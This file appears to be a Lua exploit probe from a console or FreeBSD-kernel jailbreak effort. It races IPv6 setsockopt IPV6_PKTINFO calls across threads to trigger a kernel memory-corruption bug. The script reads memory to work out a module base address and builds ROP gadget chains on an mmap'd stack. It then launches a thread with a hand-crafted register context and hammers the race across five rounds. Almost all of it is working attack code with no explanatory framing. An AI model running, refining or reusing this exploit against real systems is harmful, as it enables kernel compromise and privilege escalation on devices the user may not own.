-- CRASH_CLASS: HIGH
-- PROBE 91e: IPv6 setsockopt race — high-volume with concurrency proof
--
-- 91d: 11K calls, no panic, marker=1 (both set PKTINFO).
-- This: bigger child stack (512KB), main 30K iterations, marker sampling
-- every 500 calls to prove temporal overlap. Multiple rounds.

print("=== PROBE 91e: IPv6 RACE (HEAVY) ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local PV6=41; local PKTINFO=46

local function get_marker()
    local gb=memory.alloc(32); z(gb,32)
    local gl=memory.alloc(4); wd(gl,20)
    local rv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
    if rv~=0 then return nil end
    return rd(gb)
end

-- ============================================================
-- ROUND function: spawn child, race, report
-- ============================================================
local function do_round(rnd, s6, ncycles, main_iters)
    local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)
    local pi_m=memory.alloc(20); z(pi_m,20); wd(pi_m,1)

    local STSZ=ncycles*40+200
    STSZ=math.ceil(STSZ/0x4000)*0x4000
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then print("R"..rnd..": FAIL mmap") return false end

    local off=0
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(PKTINFO)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    local ctx=memory.alloc(0x200); z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(s6))
    wq(ctx+_SI,uint64(PV6))
    wq(ctx+_DX,uint64(PKTINFO))
    wq(ctx+_R10,uint64(N(pi_c)))
    wq(ctx+_R8,uint64(20))

    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)
    if not ok_t or N(rv_t)~=0 then
        print("R"..rnd..": thr_create FAILED")
        return false
    end

    -- Race: main setsockopt loop with marker sampling
    local m_ok,m_fail=0,0
    local child_seen=0
    local interleaves=0

    for i=1,main_iters do
        local rv=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi_m),20))
        if rv==0 then m_ok=m_ok+1 else m_fail=m_fail+1 end

        if i%500==0 then
            local mk=get_marker()
            if mk==2 then
                child_seen=child_seen+1
                interleaves=interleaves+1
            end
        end
    end

    local mk_end=get_marker()
    local ca=alive(tid)

    print("R"..rnd..": main="..m_ok.."/"..m_fail
        .." child_seen="..child_seen
        .." interleaves="..interleaves
        .." mk="..tostring(mk_end)
        .." alive="..tostring(ca))

    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
    return true
end

-- ============================================================
-- MAIN
-- ============================================================
s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end

-- Baseline
local pi0=memory.alloc(20); z(pi0,20); wd(pi0,77)
local br=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi0),20))
print("baseline rv="..br)

-- 5 rounds: 13000 child cycles each, 30000 main iterations
print("")
print("--- RACING (5 rounds) ---")
local total_interleaves=0
for r=1,5 do
    local ok=do_round(r, s6, 13000, 30000)
    if not ok then break end
    -- Reset marker between rounds
    z(pi0,20); wd(pi0,77)
    native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi0),20)
end

print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91e DONE ===")
